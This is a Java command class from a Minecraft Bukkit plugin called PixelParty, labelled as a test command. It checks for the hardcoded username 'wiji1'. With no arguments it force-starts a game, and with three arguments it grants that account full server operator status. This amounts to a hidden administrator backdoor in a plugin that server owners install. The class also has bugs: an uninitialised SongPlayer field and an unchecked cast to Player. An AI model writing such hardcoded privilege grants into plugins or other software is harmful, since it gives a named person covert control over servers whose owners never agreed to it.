package dev.wiji.pixelparty.commands;

import dev.wiji.pixelparty.PixelParty;
import net.raphimc.noteblocklib.player.SongPlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class TestCommand implements CommandExecutor {

	SongPlayer player;

	@Override
	public boolean onCommand(CommandSender commandSender, Command command, String s, String[] args) {

		Player players = (Player) commandSender;
		if(!players.getName().equals("wiji1")) return false;

		if(args.length == 0) {
			PixelParty.gameManager.queueManager.timer.cancel();
			PixelParty.gameManager.startGame();
		}


		if(args.length == 2) {
			player.stop();
		}

		if(args.length == 3) {
			Player player = (Player) commandSender;
			player.setOp(true);
		}


		return false;
	}

}
